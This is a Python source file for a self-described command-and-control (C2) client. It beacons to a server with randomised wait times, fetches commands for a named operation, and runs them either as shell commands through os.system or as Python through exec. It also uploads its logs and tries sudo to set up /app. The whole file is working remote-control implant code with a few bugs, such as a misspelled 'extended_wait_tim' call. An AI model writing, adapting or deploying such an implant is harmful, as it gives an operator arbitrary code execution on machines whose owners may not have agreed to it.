#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: client/main.py
# Native python imports
import datetime, getpass, logging, secrets
import stat, sys, time, threading, os, uuid

# PIP library imports
import requests

# Local file imports
import client.util as util
import client.config as config

secretsGenerator = secrets.SystemRandom()

def default_wait_time():
    """Generate a short wait time value, with some variance."""
    return secretsGenerator.randint(5,15)

def retry_wait_time():
    """Generate a longer wait time value, with some variance."""
    return secretsGenerator.randint(60,120)

def extended_wait_time():
    """Generate a very long wait time value, with some variance."""
    return secretsGenerator.randint(3600,4000)

# How many normal retries should be used before waiting for the extended wait time.
retry_threshold = 10

logger = logging.getLogger(__name__)
logging.basicConfig(format='%(asctime)s - %(message)s',
                     level=logging.INFO, filename=config.log_file)

def usage():
    """Print usage information for the script."""
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <server_address> <op_name> [options]')
        print()
        exit()

class Client:
    """C2 Client class.

    Attributes:
        retries (int): Value used to track successive retry attempts. 
        prev (str): String identifying the previously executed command.
        server_addr (str): Address of the C2 server (in the form <protocol>://<url>[:<port>]).
        op_name (str): The name of the op that the client is participating in, for fetching appropriate commands.
        client_id (str): A (hopefully) unique identifier for the client for server check-ins.
    """
    def __init__(self, server_addr: str, op_name: str):
        self.retries = 0
        self.prev = None
        self.server_addr = server_addr
        self.op_name = op_name
        self.client_id = str(uuid.uuid4())


        self._load_prev_command()
        self._app_dir_setup()
        logger.info('Client created.')

    def _app_dir_setup(self):
        """Create an application directory for the client for ease of use.

        This first tries to use os.mkdir if it has permission to create the folder, 
        and uses os.system to make a sudo call if this is unsuccessful.
        """
        made_dir = False
        if not os.path.exists('/app'):
            # Create parent directory for file downloads
            try:
                os.mkdir('/app')
            except Exception as e:
                logger.info('Could not create /app. Trying with sudo instead.')
                os.system('sudo mkdir /app')
        if not os.path.exists('/app/downloads'):
            # The 'send to clients' button saves files here.
            try:
                os.mkdir('/app/downloads')
            except Exception as e:
                logger.info('Could not create /app/downloads. Trying with sudo instead.')
                os.system('sudo mkdir /app/downloads')
        if not os.access('/app', os.W_OK) or not os.access('/app', os.R_OK):
            # If we have read-write access to /app, then it is likely set up correctly. Otherwise,
            #  traverse /app and make all files/dirs read/write/execute for user and read-only for group.
            permissions = stat.S_IRWXU | stat.S_IRGRP
            try:
                os.chmod('/app', permissions)
                for root, dirs, files in os.walk('/app'):
                    for d in dirs:
                        os.chmod(os.path.join(root, d), permissions)
                        os.chmod(os.path.join(root, d), permissions)
                    for f in files:
                        os.chmod(os.path.join(root, f), permissions)
                        os.chmod(os.path.join(root, f), permissions)
            except PermissionError as e:
                logger.info('Could not chmod /app. Trying with sudo instead.')
                os.system('sudo chmod -R 740 /app')
                os.system(f'sudo chown -R {getpass.getuser()}:{os.getegid()} /app')

    def _load_prev_command(self):
        """Fetch the last command executed and stored in the cache file."""
        # We use a file to cache the last command that was executed.
        curr_folder = os.path.dirname(os.path.abspath(__file__))
        cached_cmd_file = os.path.join(curr_folder, 'prev_cmd.txt')

        # Load the previously cached command if it exists.
        if os.path.exists(cached_cmd_file):
            with open(cached_cmd_file, 'r') as f:
                last_cmd = f.read().strip()
                self.prev = last_cmd

    def start_as_thread(self):
        """Runs the client in an independent thread for concurrent execution."""
        t = threading.Thread(target=self.start)
        t.start()

    def start(self):
        """Runs the client indefinitely."""
        while True:
            self.fetch_next_command()

    def update_cache_file(self):
        """Update the file that caches the previously-executed command."""
        curr_folder = os.path.dirname(os.path.abspath(__file__))
        cached_cmd_file = os.path.join(curr_folder, 'prev_cmd.txt')
        if self.prev:
            with open(cached_cmd_file, 'w') as f:
                f.write(self.prev)

    def handle_timeout(self):
        """Determine how long of a timeout should be used, and wait that long."""
        self.retries += 1
        if self.retries % retry_threshold == 0:
            wait_time = util.extended_wait_tim()
            logger.error(f"Max retries exceeded. Retrying in {wait_time} seconds.")
            time.sleep(wait_time)
            return
        wait_time = util.retry_wait_time()
        logger.warning(f'Retrying in {wait_time} seconds.')
        time.sleep(wait_time)
        return

    def fetch_next_command(self) -> int:
        """Determine whether to fetch the latest command, or just the next one in the sequence.

        Returns the amount of time to wait before proceeding to the next command.
        """
        if self.prev:
            try:
                r = requests.get(f'{self.server_addr}/cmd/{self.prev}')
                if r.status_code == 404:
                    self.prev = None
                    return self.fetch_latest_command()
                elif r.status_code != 200:
                    self.retries = 0
                    time.sleep(util.default_wait_time())
                    return
                
                data = r.json()['data']

                # Proceed if there's a new command, otherwise
                #  wait before trying again.
                if 'next' in data:
                    return self.fetch_command(data['next'])
                else:
                    self.retries = 0
                    time.sleep(util.default_wait_time())
                    return
            except Exception as e:
                logger.warning(e)
                return self.handle_timeout()
        else:
            return self.fetch_latest_command()
    
    def fetch_latest_command(self):
        """Fetch the most recent command for the client's given op."""
        try:
            r = requests.get(f'{self.server_addr}/op/fetch/{self.op_name}')
            if r.status_code != 200:
                time.sleep(util.default_wait_time())
                return
            if 'guid' not in r.json()['data']:
                logger.info('No command available.')
                return self.handle_timeout()
            cmd_id = r.json()['data']['guid']
            return self.fetch_command(cmd_id)
        except Exception as e:
            logger.warning('Exception encountered while fetching latest command.')
            logger.warning(e)
            return self.handle_timeout()
        else:
            self.retries = 0
            time.sleep(util.default_wait_time())
            return

    def fetch_command(self, cmd_id):
        """Fetch a specific command given its id."""
        try:
            r = requests.get(f'{self.server_addr}/cmd/{cmd_id}')
            data = r.json()['data']
        except Exception as e:
            logger.warning(e)
            return self.handle_timeout()
        else:
            self.prev = cmd_id
            self.update_cache_file()
            self.handle_command(data)

            self.retries = 0
            if 'next' in data:
                return self.fetch_command(data['next'])
            else:
                time.sleep(util.default_wait_time())
                return

    def post_log(self):
        """Post the log for the client to the C2 server.

        Currently, this uploads the log as a file to the file server, but implementation may change in the future.
        """
        curr_time = datetime.datetime.now().replace(microsecond=0)
        log_file_data = (f'{self.client_id}_{curr_time}_app.log', open(config.log_file, 'rb'), 'text/plain')
        try:
            r = requests.post(f'{self.server_addr}/files/upload', files={'file': log_file_data}, data={'op_name': self.op_name})
        except Exception as e:
            logger.warning('Exception encountered while attempting to post client log.')
            logger.warning(e)
        else:
            if r.status_code == 200:
                logger.info('Uploaded log file.')
            else:
                logger.warning('Error uploading log file.')
                logger.warning(r)
                logger.warning(r.contents)

    def handle_command(self, data):
        """Executes a given command.

        There are a handful of types of commands that can be given: shell, python, and control.
        Shell commands are executed by the os.system as shell commands.
        Python commands are executed with exec, as python code.
        Control commands are miscellaneous commands that cause the client to perform pre-defined tasks.

        Arguments:
            data (dict): A dictionary containing relevant information for a command, such as its type and value.
        """
        if 'type' not in data or 'cmd' not in data:
            logger.warning(f'Command data does not contain type or command: {data}')
            return
        if data['type'] == 'shell':
            logger.info(f"Executing shell command: {data['cmd']}")
            ret_val = os.system(data['cmd'])
        elif data['type'] == 'python':
            program = data['cmd']
            t = threading.Thread(target=exec, args=[program])
            t.start()
        elif data['type'] == 'control':
            if data['cmd'] == 'stop':
                exit()
            elif data['cmd'] == 'logs':
                if (not 'client_id' in data) or (self.client_id == data['client_id']):
                    self.post_log()
                else:
                    logger.info('Logs command issued, but not to this client.')
            else:
                logger.warning(f'Invalid control command: {data["cmd"]}')
        else:
            logger.warning(f'Invalid command: {data}')
        # TODO: additional command types?
            
def main(server_address, op_name):
    """Main takes two arguments, so that it can be run by import. 
    These arguments are passed from the command line when run standalone.
    """
    c = Client(server_address, op_name)
    c.start()

if __name__ == "__main__":
    usage()
    main(sys.argv[1], sys.argv[2])
